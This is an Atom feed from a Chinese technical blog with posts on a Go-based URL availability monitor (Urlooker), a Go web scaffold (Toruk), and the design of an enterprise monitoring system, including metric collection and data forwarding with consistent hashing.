<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AsuraQin</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.x2know.org/"/>
  <updated>2016-08-10T13:46:02.000Z</updated>
  <id>http://blog.x2know.org/</id>
  
  <author>
    <name>qinyening</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Urlooker：Web 可用性监控工具（Go）</title>
    <link href="http://blog.x2know.org/2016/08/07/urlooker/"/>
    <id>http://blog.x2know.org/2016/08/07/urlooker/</id>
    <published>2016-08-07T07:44:19.000Z</published>
    <updated>2016-08-10T13:46:02.000Z</updated>
    
    <content type="html">&lt;p&gt;分享下最近写的 url 监控 项目 &lt;a href=&quot;https://github.com/urlooker&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;urlooker&lt;/a&gt;，监控web服务可用性及访问质量，采用go语言编写，易于安装和二次开发&lt;/p&gt;
&lt;h2 id=&quot;Feature&quot;&gt;&lt;a href=&quot;#Feature&quot; class=&quot;headerlink&quot; title=&quot;Feature&quot;&gt;&lt;/a&gt;Feature&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;返回状态码检测&lt;/li&gt;
&lt;li&gt;页面响应时间检测&lt;/li&gt;
&lt;li&gt;页面关键词匹配检测&lt;/li&gt;
&lt;li&gt;带cookie访问&lt;/li&gt;
&lt;li&gt;agent多机房部署，指定机房访问&lt;/li&gt;
&lt;li&gt;检测结果支持向open-falcon推送&lt;/li&gt;
&lt;li&gt;支持短信和邮件告警&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Architecture&quot;&gt;&lt;a href=&quot;#Architecture&quot; class=&quot;headerlink&quot; title=&quot;Architecture&quot;&gt;&lt;/a&gt;Architecture&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://x2know.qiniudn.com/urlooker4.png&quot; alt=&quot;此处输入图片的描述&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ScreenShot&quot;&gt;&lt;a href=&quot;#ScreenShot&quot; class=&quot;headerlink&quot; title=&quot;ScreenShot&quot;&gt;&lt;/a&gt;ScreenShot&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://x2know.qiniudn.com/urlooker1.png&quot; alt=&quot;看图&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://x2know.qiniudn.com/urlooker3.png&quot; alt=&quot;此处输入图片的描述&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://x2know.qiniudn.com/urlooker2.png&quot; alt=&quot;添加监控项&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Install&quot;&gt;&lt;a href=&quot;#Install&quot; class=&quot;headerlink&quot; title=&quot;Install&quot;&gt;&lt;/a&gt;Install&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;环境依赖&lt;/strong&gt;&lt;br&gt;安装mysql &amp;amp; redis&lt;br&gt;wget &lt;a href=&quot;http://x2know.qiniudn.com/schema.sql&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://x2know.qiniudn.com/schema.sql&lt;/a&gt;&lt;br&gt;将schema.sql 导入数据库  &lt;/p&gt;
&lt;p&gt;二进制安装(Ubuntu 14.4 Go1.6下编译)：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget http://x2know.qiniudn.com/urlooker.tar.gz
tar xzvf urlooker.tar.gz
cd urlooker
# 修改下cfg.json中的mysql和redis配置
web/control start
alarm/control start
agent/control start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打开浏览器访问 &lt;a href=&quot;http://127.0.0.1:1984&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://127.0.0.1:1984&lt;/a&gt; 即可&lt;/p&gt;
&lt;p&gt;源码安装及详细介绍见：&lt;br&gt;web 组件&lt;a href=&quot;https://github.com/URLooker/web&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;安装&lt;/a&gt;&lt;br&gt;agent 组件&lt;a href=&quot;https://github.com/URLooker/agent&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;安装&lt;/a&gt;&lt;br&gt;alarm 组件&lt;a href=&quot;https://github.com/URLooker/alarm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;安装&lt;/a&gt;   &lt;/p&gt;
&lt;h2 id=&quot;Thanks&quot;&gt;&lt;a href=&quot;#Thanks&quot; class=&quot;headerlink&quot; title=&quot;Thanks&quot;&gt;&lt;/a&gt;Thanks&lt;/h2&gt;&lt;p&gt;一些功能参考了open-falcon，感谢 &lt;a href=&quot;http://ulricqin.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;UlricQin&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://github.com/laiwei&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;laiwei&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;分享下最近写的 url 监控 项目 &lt;a href=&quot;https://github.com/urlooker&quot;&gt;urlooker&lt;/a&gt;，监控web服务可用性及访问质量，采用go语言编写，易于安装和二次开发&lt;/p&gt;
&lt;h2 id=&quot;Feature&quot;&gt;&lt;a href=&quot;#Feature&quot; class=&quot;headerlink&quot; title=&quot;Feature&quot;&gt;&lt;/a&gt;Feature&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;返回状态码检测&lt;/li&gt;
&lt;li&gt;页面响应时间检测&lt;/li&gt;
&lt;li&gt;页面关键词匹配检测&lt;/li&gt;
&lt;li&gt;带cookie访问&lt;/li&gt;
&lt;li&gt;agent多机房部署，指定机房访问&lt;/li&gt;
&lt;li&gt;检测结果支持向open-falcon推送&lt;/li&gt;
&lt;li&gt;支持短信和邮件告警
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Go Web开发脚手架 Toruk</title>
    <link href="http://blog.x2know.org/2016/07/11/go-web-toruk/"/>
    <id>http://blog.x2know.org/2016/07/11/go-web-toruk/</id>
    <published>2016-07-11T07:41:48.000Z</published>
    <updated>2016-08-09T06:17:44.000Z</updated>
    
    <content type="html">&lt;p&gt;使用golang开发项目也有一年时间了，也开发了一些web的项目，把和同事&lt;a href=&quot;http://ulricqin.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;UlricQin&lt;/a&gt;一起开发的项目中一些第三方库抽离出来，整理了一个go web开发脚手架，Toruk主要包括一下几个部分:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;路由：github.com/gorilla/mux&lt;/li&gt;
&lt;li&gt;渲染模板：github.com/unrolled/render&lt;/li&gt;
&lt;li&gt;Cookie封装：github.com/gorilla/securecookie&lt;/li&gt;
&lt;li&gt;中间件：github.com/codegangsta/negroni&lt;/li&gt;
&lt;li&gt;上下文传输：github.com/gorilla/context&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;文件结构&quot;&gt;&lt;a href=&quot;#文件结构&quot; class=&quot;headerlink&quot; title=&quot;文件结构&quot;&gt;&lt;/a&gt;文件结构&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://x2know.qiniudn.com/toruk2.png&quot; width=&quot;300&quot; style=&quot;margin-left:0px&quot; alt=&quot;图片描述&quot; align=&quot;center&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;使用方法&quot;&gt;&lt;a href=&quot;#使用方法&quot; class=&quot;headerlink&quot; title=&quot;使用方法&quot;&gt;&lt;/a&gt;使用方法&lt;/h3&gt;&lt;p&gt;通过修改http/ruote.go 将数据传到对应的handler中，然后在通过render将数据返回回去。&lt;br&gt;ruote.go &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func configConfRoutes(r *mux.Router) {
    r.HandleFunc(&amp;quot;/home&amp;quot;, handler.HomeIndex).Methods(&amp;quot;GET&amp;quot;)
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;handler.go&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func HomeIndex(w http.ResponseWriter, r *http.Request) {
    render.HTML(r, w, &amp;quot;home/index&amp;quot;)
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;初始化&quot;&gt;&lt;a href=&quot;#初始化&quot; class=&quot;headerlink&quot; title=&quot;初始化&quot;&gt;&lt;/a&gt;初始化&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# set $GOPATH and $GOROOT
# 比如你的项目名称叫做 awosome
cd $GOPATH/src
git clone https://github.com/710leo/Toruk.git
mv Toruk awosome
cd awosome
./init awosome
go get ./...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有问题欢迎私信交流：&lt;a href=&quot;http://weibo.com/710x710&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;710leo&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;使用golang开发项目也有一年时间了，也开发了一些web的项目，把和同事&lt;a href=&quot;http://ulricqin.com&quot;&gt;UlricQin&lt;/a&gt;一起开发的项目中一些第三方库抽离出来，整理了一个go web开发脚手架，Toruk主要包括一下几个部分:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;路由：github.com/gorilla/mux&lt;/li&gt;
&lt;li&gt;渲染模板：github.com/unrolled/render&lt;/li&gt;
&lt;li&gt;Cookie封装：github.com/gorilla/securecookie&lt;/li&gt;
&lt;li&gt;中间件：github.com/codegangsta/negroni&lt;/li&gt;
&lt;li&gt;上下文传输：github.com/gorilla/context
    
    </summary>
    
    
      <category term="go" scheme="http://blog.x2know.org/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>企业级监控系统设计实践（三）数据转发</title>
    <link href="http://blog.x2know.org/2016/07/07/monitor-system3/"/>
    <id>http://blog.x2know.org/2016/07/07/monitor-system3/</id>
    <published>2016-07-07T15:58:56.000Z</published>
    <updated>2016-07-10T15:52:49.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;插件&quot;&gt;&lt;a href=&quot;#插件&quot; class=&quot;headerlink&quot; title=&quot;插件&quot;&gt;&lt;/a&gt;插件&lt;/h2&gt;&lt;p&gt;上节讲了关于机器指标的采集，本节讲一下业务数据的采集，业务数据其实我们做的主要就是制定规范，告诉用户按照什么样的数据格式上报数据&lt;/p&gt;
&lt;p&gt;根据经验，数据格式主要需要下面几个指标&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;metric&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;告诉监控系统数据项是什么&lt;br&gt;value&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;ensp;指标的数值&lt;br&gt;endpoint&amp;emsp;&amp;emsp;&amp;ensp;  上报数据的来源&lt;br&gt;tag&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; 形式为a=b，通过tag可以匹配一批数据&lt;br&gt;timestamp&amp;emsp;&amp;ensp; 上报时间&lt;br&gt;step &amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; 上报间隔&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;上节中提到了数据大致分为两类，其实还有一类比较特殊的情况。&lt;br&gt;比如有个深度学习的部门，有100台机器，他们想要监控这些机器的GPU信息，这些信息不够通用，所以不能通过agent采集，但如果用户自己采集的话，将脚本部署到100台机器上又很麻烦，那怎么办呢？用户自己部署脚本麻烦，就让agent帮忙部署，具体流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户只要把自己写的脚本安装规范写好&lt;/li&gt;
&lt;li&gt;发布到指定的git上&lt;/li&gt;
&lt;li&gt;agent根据git地址将脚本全部拉取到本地&lt;/li&gt;
&lt;li&gt;用户在一个配置中心设置哪些机器执行哪些插件&lt;/li&gt;
&lt;li&gt;agent根据配置运行指定的插件&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;到这里数据的采集已经完成了，下面开始思考怎么接收数据，然后用来告警判断和绘图。&lt;/p&gt;
&lt;h2 id=&quot;数据转发&quot;&gt;&lt;a href=&quot;#数据转发&quot; class=&quot;headerlink&quot; title=&quot;数据转发&quot;&gt;&lt;/a&gt;数据转发&lt;/h2&gt;&lt;p&gt;如果负责告警判断和绘图的组件都是无状态的，那这些组件前面只要挂一个lvs，直接将数据推送上去即可。但如果组件是有状态的，那就要额外需要一个组件，来保证同一条信息每次都发送到相同的机器上去。&lt;/p&gt;
&lt;p&gt;这个转发数据的组件就先起名叫transfer，下面就主要讲一下transfer的功能需要和具体实现，&lt;br&gt;功能需求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同一条数据每次都转发到同一个机器上&lt;/li&gt;
&lt;li&gt;数据要保证快速转发&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;具体实现：&lt;/p&gt;
&lt;p&gt;要保证数据的一致性，最简单的是对上报的数据做hash，然后取余，但这样有一个问题，当后端的机器挂掉一台或者增加一台时，会有大量数据需要迁移，解决这个问题有两种方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;把每个数据上报的对应关系记录到一个路由表中，当后端机器个数发生变化时，原来的数据不进行迁移，新数据的分配重新记录到一个路由表中，旧数据慢慢往新数据迁移&lt;/li&gt;
&lt;li&gt;利用一致性hash算法，做到后端机器数变化时，只有少量数据进行迁移&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一种方法可以保证数据没有丢失，但路由表的维护成本很高&lt;br&gt;第二种方法虽然在数据迁移时会有少部分数据丢失，实现起来比第一种简单&lt;/p&gt;
&lt;p&gt;于是决定采用第二种方式，下面讲下具体代码实现goalng版&lt;br&gt;首先需要一个hash环&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import &amp;quot;stathat.com/c/consistent&amp;quot;

type ConsistentHashNodeRing struct {
    ring *consistent.Consistent
}
func NewConsistentHashNodeRing(NumberOfReplicas int, nodes []string) *ConsistentHashNodeRing {
    ret := &amp;amp;ConsistentHashNodeRing{ring: consistent.New()}
    ret.SetNumberOfReplicas(NumberOfReplicas)
    ret.SetNodes(nodes)
    return ret
}
//设置虚拟节点个数
func (this *ConsistentHashNodeRing) SetNumberOfReplicas(num int) {
    this.ring.NumberOfReplicas = num
}

//增加实际节点
func (this *ConsistentHashNodeRing) SetNodes(nodes []string) {
    for _, node := range nodes {
        this.ring.Add(node)
    }
}   
//拿到某个数据属于的节点
func (this *ConsistentHashNodeRing) GetNode(pk string) (string, error) {
    return this.ring.Get(pk)
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过NewConsistentHashNodeRing()这个函数，初始化一个一致性hash环，hash环的节点是一个后端机器地址相关的map中的key，通过GetNode()，拿到上报数据对应的节点，再得到要发送的后端地址。&lt;/p&gt;
&lt;h4 id=&quot;使用队列&quot;&gt;&lt;a href=&quot;#使用队列&quot; class=&quot;headerlink&quot; title=&quot;使用队列&quot;&gt;&lt;/a&gt;使用队列&lt;/h4&gt;&lt;p&gt;如果拿到数据后即刻就就像后端转发，这样会有大量链接，每个链接只发送很少的数据，对网络资源造成浪费，怎么优化这个问题呢？我们可以针对每一个节点建立一个queue，然后定期从queue读取数据向后端转发，这样每个连接可以发送一批数据，提高对连接的利用率。&lt;/p&gt;
&lt;h4 id=&quot;使用连接池&quot;&gt;&lt;a href=&quot;#使用连接池&quot; class=&quot;headerlink&quot; title=&quot;使用连接池&quot;&gt;&lt;/a&gt;使用连接池&lt;/h4&gt;&lt;p&gt;但当上报的数据非常大时，比如现在小米的监控系统每分钟要接受3000W条数据，虽然有了queue做缓冲，但transfer组件向后端发起的连接仍然非常多，此时为了提高效率，可以使用连接池。&lt;/p&gt;
&lt;p&gt;到这里，数据转发这个组件的开发思路已经讲完了，下面开始讲解告警判断和历史绘图&lt;/p&gt;
&lt;h2 id=&quot;参考：&quot;&gt;&lt;a href=&quot;#参考：&quot; class=&quot;headerlink&quot; title=&quot;参考：&quot;&gt;&lt;/a&gt;参考：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/open-falcon/transfer&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;open-falcon tranfer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;插件&quot;&gt;&lt;a href=&quot;#插件&quot; class=&quot;headerlink&quot; title=&quot;插件&quot;&gt;&lt;/a&gt;插件&lt;/h2&gt;&lt;p&gt;上节讲了关于机器指标的采集，本节讲一下业务数据的采集，业务数据其实我们做的主要就是制定规范，告诉用户按照什么样的数据格式上报数据&lt;/p&gt;
&lt;p&gt;根据经验，数据格式主要需要下面几个指标&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;metric&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;告诉监控系统数据项是什么&lt;br&gt;value&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;ensp;指标的数值&lt;br&gt;endpoint&amp;emsp;&amp;emsp;&amp;ensp;  上报数据的来源&lt;br&gt;tag&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; 形式为a=b，通过tag可以匹配一批数据&lt;br&gt;timestamp&amp;emsp;&amp;ensp; 上报时间&lt;br&gt;step &amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; 上报间隔&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="监控" scheme="http://blog.x2know.org/tags/%E7%9B%91%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>企业级监控系统设计实践（二）数据采集</title>
    <link href="http://blog.x2know.org/2016/07/03/monitor-system2/"/>
    <id>http://blog.x2know.org/2016/07/03/monitor-system2/</id>
    <published>2016-07-03T15:54:43.000Z</published>
    <updated>2016-07-10T15:34:02.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;数据采集&quot;&gt;&lt;a href=&quot;#数据采集&quot; class=&quot;headerlink&quot; title=&quot;数据采集&quot;&gt;&lt;/a&gt;数据采集&lt;/h1&gt;&lt;p&gt;收到数据采集，那我们主要需要哪些数据呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;机器的状态，cpu，内存&lt;/li&gt;
&lt;li&gt;业务自己产生的数据，如qps等&lt;/li&gt;
&lt;li&gt;mysql，redis等开源软件自身的状态数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面的数据大致可以分为两类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;机器指标&lt;/li&gt;
&lt;li&gt;业务数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;采集方式也有两种：push和pull&lt;br&gt;当agent数量非常庞大时，如果采用pull的方式，server端需要保持大量的链接，非常消耗性能，所以我们采用agent push数据的方式&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;首先总结下机器指标的采集&quot;&gt;&lt;a href=&quot;#首先总结下机器指标的采集&quot; class=&quot;headerlink&quot; title=&quot;首先总结下机器指标的采集&quot;&gt;&lt;/a&gt;首先总结下机器指标的采集&lt;/h2&gt;&lt;h4 id=&quot;cpu&quot;&gt;&lt;a href=&quot;#cpu&quot; class=&quot;headerlink&quot; title=&quot;cpu&quot;&gt;&lt;/a&gt;cpu&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;cpu.busy&lt;/li&gt;
&lt;li&gt;cpu.cnt&lt;/li&gt;
&lt;li&gt;cpu.guest&lt;/li&gt;
&lt;li&gt;cpu.idle&lt;/li&gt;
&lt;li&gt;cpu.iowait&lt;/li&gt;
&lt;li&gt;cpu.irq&lt;/li&gt;
&lt;li&gt;cpu.nice&lt;/li&gt;
&lt;li&gt;cpu.softirq&lt;/li&gt;
&lt;li&gt;cpu.steal&lt;/li&gt;
&lt;li&gt;cpu.system&lt;/li&gt;
&lt;li&gt;cpu.user&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如何计算cpu利用率呢？&lt;br&gt;计算原理如下：&lt;a href=&quot;http://blog.csdn.net/rheostat/article/details/8167479&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;传送门&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先得到每个cpu的状态，封装成一个函数CurrentProcStat()&lt;br&gt;代码如下&lt;br&gt;&lt;a href=&quot;http://pastebin.ubuntu.com/18247784/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pastebin.ubuntu.com/18247784/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;然后将得到的数据存到一个数组 procStatHistory 中，定期跟新数组中的cpu的状态值&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func UpdateCpuStat() error {
    ps, err := CurrentProcStat() 
    if err != nil {
        return err
    }
    psLock.Lock()
    defer psLock.Unlock()
    for i := historyCount - 1; i &amp;gt; 0; i-- {
        procStatHistory[i] = procStatHistory[i-1]
    }
    procStatHistory[0] = ps
    return nil
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;计算结果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cpuIdle := float64(procStatHistory[0].Cpu.Idle-procStatHistory[1].Cpu.Idle)*100.00/float64(procStatHistory[0].Cpu.Total - procStatHistory[1].Cpu.Total)
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&quot;内存&quot;&gt;&lt;a href=&quot;#内存&quot; class=&quot;headerlink&quot; title=&quot;内存&quot;&gt;&lt;/a&gt;内存&lt;/h4&gt;&lt;p&gt;一般内存监控一下几个指标即可&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;memfree&lt;/li&gt;
&lt;li&gt;memtotal&lt;/li&gt;
&lt;li&gt;memused&lt;/li&gt;
&lt;li&gt;swapfree&lt;/li&gt;
&lt;li&gt;swaptotal&lt;/li&gt;
&lt;li&gt;swapused&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些指标的数据可以从/proc/meminfo中获取,linux下输入 cat /proc/meminfo 得到以下信息&lt;br&gt;&lt;img src=&quot;http://x2know.qiniudn.com/meminfo.jpg&quot; alt=&quot;此处输入图片的描述&quot;&gt;&lt;br&gt;几个主要指标的说明&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MemTotal — 总的内存大小，单位kb&lt;br&gt;MemFree    — 空闲的内存大小，单位kb&lt;br&gt;SwapTotal — 总swap大小，单位kb&lt;br&gt;SwapFree — 空闲wsap大小，单位kb&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;获取内存的具体代码实现 &lt;a href=&quot;http://pastebin.ubuntu.com/16199860/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pastebin.ubuntu.com/16199860/&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;磁盘相关采集项&quot;&gt;&lt;a href=&quot;#磁盘相关采集项&quot; class=&quot;headerlink&quot; title=&quot;磁盘相关采集项&quot;&gt;&lt;/a&gt;磁盘相关采集项&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;df.bytes.free&lt;/li&gt;
&lt;li&gt;df.bytes.total&lt;/li&gt;
&lt;li&gt;df.bytes.used&lt;/li&gt;
&lt;li&gt;df.inodes.free&lt;/li&gt;
&lt;li&gt;df.inodes.total&lt;/li&gt;
&lt;li&gt;df.inodes.used&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;linux下查看命令：df -lh(/ih)&lt;br&gt;采集方法：&lt;br&gt;读取/proc/mounts拿到所有挂载点&lt;br&gt;具体代码：&lt;a href=&quot;http://pastebin.ubuntu.com/16201041&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pastebin.ubuntu.com/16201041&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过golang &lt;a href=&quot;https://golang.org/pkg/syscall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;syscall&lt;/a&gt;包中的 Statfs函数得到磁盘blocks和inode的使用情况。&lt;br&gt;具体代码如下：&lt;a href=&quot;http://pastebin.ubuntu.com/18287842&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pastebin.ubuntu.com/18287842&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;磁盘io采集项&quot;&gt;&lt;a href=&quot;#磁盘io采集项&quot; class=&quot;headerlink&quot; title=&quot;磁盘io采集项&quot;&gt;&lt;/a&gt;磁盘io采集项&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;disk.io.avgqu-sz  平均每次设备I/O操作的数据大小&lt;/li&gt;
&lt;li&gt;disk.io.avgrq-sz  平均I/O队列长度&lt;/li&gt;
&lt;li&gt;disk.io.await  平均每次设备I/O操作的等待时间&lt;/li&gt;
&lt;li&gt;disk.io.ios_in_progress  &lt;/li&gt;
&lt;li&gt;disk.io.msec_read  读消耗时间&lt;/li&gt;
&lt;li&gt;disk.io.msec_write 写消耗时间&lt;/li&gt;
&lt;li&gt;disk.io.msec_total io总消耗时间&lt;/li&gt;
&lt;li&gt;disk.io.msec_weighted_total  加权io总消耗时间&lt;/li&gt;
&lt;li&gt;disk.io.read_bytes&lt;/li&gt;
&lt;li&gt;disk.io.read_merged&lt;/li&gt;
&lt;li&gt;disk.io.read_requests &lt;/li&gt;
&lt;li&gt;disk.io.read_sectors&lt;/li&gt;
&lt;li&gt;disk.io.write_bytes &lt;/li&gt;
&lt;li&gt;disk.io.write_merged&lt;/li&gt;
&lt;li&gt;disk.io.write_requests&lt;/li&gt;
&lt;li&gt;disk.io.write_sectors&lt;/li&gt;
&lt;li&gt;disk.io.svctm  平均每次io消耗时间&lt;/li&gt;
&lt;li&gt;disk.io.util 单位时间内（1s）读写占用时间比例&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;linux下查看命令：&lt;a href=&quot;http://linux.die.net/man/1/iostat&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;iostat&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;机器负载采集项&quot;&gt;&lt;a href=&quot;#机器负载采集项&quot; class=&quot;headerlink&quot; title=&quot;机器负载采集项&quot;&gt;&lt;/a&gt;机器负载采集项&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;load.1min&lt;/li&gt;
&lt;li&gt;load.5min&lt;/li&gt;
&lt;li&gt;load.15min&lt;br&gt;采集方法：直接读取/proc/loadavg&lt;br&gt;linux下查看命令：top&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;网络相关采集项&quot;&gt;&lt;a href=&quot;#网络相关采集项&quot; class=&quot;headerlink&quot; title=&quot;网络相关采集项&quot;&gt;&lt;/a&gt;网络相关采集项&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;net.if.in.compressed&lt;/li&gt;
&lt;li&gt;net.if.in.dropped&lt;/li&gt;
&lt;li&gt;net.if.in.errors&lt;/li&gt;
&lt;li&gt;net.if.in.fifo.errs&lt;/li&gt;
&lt;li&gt;net.if.in.frame.errs&lt;/li&gt;
&lt;li&gt;net.if.in.multicast&lt;/li&gt;
&lt;li&gt;net.if.in.packets&lt;/li&gt;
&lt;li&gt;net.if.out.bytes&lt;/li&gt;
&lt;li&gt;net.if.out.carrier.errs&lt;/li&gt;
&lt;li&gt;net.if.out.collisions&lt;/li&gt;
&lt;li&gt;net.if.out.compressed&lt;/li&gt;
&lt;li&gt;net.if.out.dropped&lt;/li&gt;
&lt;li&gt;net.if.out.errors&lt;/li&gt;
&lt;li&gt;net.if.out.fifo.errs&lt;/li&gt;
&lt;li&gt;net.if.out.packets&lt;/li&gt;
&lt;li&gt;net.if.total.bytes&lt;/li&gt;
&lt;li&gt;net.if.total.dropped&lt;/li&gt;
&lt;li&gt;net.if.total.errors&lt;/li&gt;
&lt;li&gt;net.if.total.packets&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;采集方法，读取/proc/net/dev的内容&lt;br&gt;具体实现代码：&lt;a href=&quot;http://pastebin.ubuntu.com/18293996/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pastebin.ubuntu.com/18293996/&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;端口信息采集&quot;&gt;&lt;a href=&quot;#端口信息采集&quot; class=&quot;headerlink&quot; title=&quot;端口信息采集&quot;&gt;&lt;/a&gt;端口信息采集&lt;/h4&gt;&lt;p&gt;linux 查看开放端口命令：ss -tln&lt;br&gt;采集方法：利用golang 调用系统命令的方式获取开放的端口&lt;/p&gt;
&lt;h4 id=&quot;进程状态采集&quot;&gt;&lt;a href=&quot;#进程状态采集&quot; class=&quot;headerlink&quot; title=&quot;进程状态采集&quot;&gt;&lt;/a&gt;进程状态采集&lt;/h4&gt;&lt;p&gt;由于系统运行的进程非常多，所以这类采集需要用户配置&lt;br&gt;采集方法：读取 /proc/pid/status 下的内容&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;机器相关的采集项基本就是这些了，接下来将思考怎样接收业务数据，以及对数据的转发处理&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;参考：&quot;&gt;&lt;a href=&quot;#参考：&quot; class=&quot;headerlink&quot; title=&quot;参考：&quot;&gt;&lt;/a&gt;参考：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.zabbix.com/documentation/3.2/manual/config/items/itemtypes/zabbix_agent&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;zabbix agent&lt;/a&gt;&lt;/li&gt;
